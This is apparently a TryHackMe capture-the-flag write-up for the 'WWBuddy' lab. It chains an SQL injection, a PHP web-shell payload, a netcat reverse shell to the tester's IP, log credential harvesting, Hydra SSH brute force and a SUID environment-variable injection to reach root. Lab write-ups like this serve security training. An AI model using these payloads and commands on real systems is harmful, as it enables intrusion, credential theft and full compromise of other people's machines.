# WWBuddy

**Challenge Level:** Medium  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe  

---

## 📝 Description

> World Wide Buddy is a site for making friends, but it's still unfinished and it has some security flaws.  
> Deploy the machine and find the flags hidden in the room!

---

# 🧭 Recon & Initial Access

## Step 1 – Deploy the Machine

After deploying the target machine, obtain the assigned IP address and visit it in the browser.

The website presents a basic **login page** with username and password fields.

Testing with default credentials like:

```
root : root
```

Returns:

```
No account found with that username.
```

However, the error message reveals something important:

⚠️ The application differentiates between *non-existent users* and *incorrect passwords* — a potential information disclosure weakness.

---

## Step 2 – Account Creation & Enumeration

We register a new account:

```
Username: admin
Password: admin123
```

After logging in, we receive a welcome message:

```
Hello, welcome to World Wide Buddy...
```

We notice we are at:

```
/login/index.php
```

Attempting to access `/admin/` directly results in **access denied**.

Time to look for vulnerabilities.

---

# 💉 SQL Injection – Privilege Escalation

## Step 3 – Profile Editing Vulnerability

Inside the account settings, there is an **Edit Info** section allowing modification of:

- Username
- Country
- Email
- Birthday
- Description

Testing for input sanitization reveals that the application is vulnerable to **SQL Injection**.

We use the payload:

```sql
' OR 1=1 -- -
```

This forces the database condition to evaluate as true.

We change the password to:

```
admin321
```

After logging out, we can now log in as:

```
Username: WWBuddy
Password: admin321
```

We now have access to additional user accounts.

---

# 🖥️ Remote Code Execution (RCE)

## Step 4 – Discovering Admin Functionality

Inside the admin area, we see logs such as:

```
192.168.0.139 2020-07-24 22:54:34 WWBuddy ...
```

We already identified that **username input is not sanitized**.

This means we can inject PHP code into the username field.

### Payload:

```php
<?php system($_GET['cmd']); ?>
```

After updating the username, accessing:

```
http://<TARGET-IP>/admin/?cmd=pwd
```

Executes system commands.

✅ We now have **Remote Code Execution**.

---

# 🐚 Reverse Shell

## Step 5 – Gaining Shell Access

We generate a reverse shell using:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR-IP> 4444 >/tmp/f
```

URL-encoded version:

```
rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>&1|nc+YOUR.IP+4444+>/tmp/f
```

After fixing URL encoding issues, we receive a reverse shell.

Upgrade to TTY:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

---

# 🚩 Flag 1 – Web Flag

Inspecting logs such as:

```
/var/log/apache2/access.log
```

We find:

```
THM{d0nt_try_4nyth1ng_redacted}
```

---

# 👤 User Privilege Escalation

## Step 6 – MySQL Log Analysis

Browsing system logs reveals:

```
/var/log/mysql/general.log
```

Inside, we find credentials for user:

```
Roberto
Password: yVnocsXsf%X68wf
```

Switch user:

```bash
su roberto
```

Inside `/home/roberto`, we find:

```
importante.txt
```

Contents include:

```
THM{g4d0_d+_redacted}
```

✅ **User Flag Retrieved**

---

# 🔐 SSH Brute Force – Jenny

The message in `importante.txt` contains hints:

- Jenny
- She turns 26 next week
- File created July 27, 2020

Calculation:

```
2020 - 26 = 1994
```

We generate a wordlist in format:

```
mm/dd/yyyy
```

Example entries:

```
08/03/1994
07/29/1994
08/01/1994
...
```

Using Hydra:

```bash
hydra -l jenny -P wordlist.txt ssh://<TARGET-IP>/ -t 60
```

Result:

```
login: jenny
password: 08/03/1994
```

Login:

```bash
ssh jenny@<TARGET-IP>
```

---

# 👑 Root Privilege Escalation

## Step 7 – SUID Enumeration

Check SUID binaries:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

Interesting binary found:

```
/bin/authenticate
```

We copy it locally using `scp` and analyze it in **Ghidra**.

---

## Step 8 – Reverse Engineering

Decompiled code shows:

```c
__src = getenv("USER");
setuid(0);
strncat((char *)&local_48,__src,0x14);
system((char *)&local_48);
```

The program:

1. Gets `USER` environment variable
2. Elevates privileges (`setuid(0)`)
3. Executes:

```
usermod -G developer <USER>
```

⚠️ The program does not sanitize `USER`.

---

## Step 9 – Exploiting Environment Variable

We inject:

```bash
export USER=";bash"
```

Then execute:

```bash
/bin/authenticate
```

This results in:

```
usermod -G developer ;bash
```

Since it runs as root, it spawns a **root shell**.

---

# 🚩 Final Flag – Root

Navigate to:

```bash
cd /root
cat root.txt
```

Flag:

```
THM{ch4ng3_th3_redacted}
```

---

# 🧠 Key Takeaways

- SQL Injection due to unsanitized input
- PHP code injection leading to RCE
- Credential discovery via log files
- SSH brute forcing with contextual wordlists
- SUID binary abuse
- Environment variable injection for privilege escalation
- Reverse engineering with Ghidra

---

# 🏁 Summary

This challenge demonstrated a full attack chain:

1. SQL Injection  
2. Remote Code Execution  
3. Reverse Shell  
4. Credential Harvesting  
5. SSH Brute Force  
6. SUID Exploitation  
7. Root Privilege Escalation  

A perfect example of chaining multiple vulnerabilities into full system compromise.
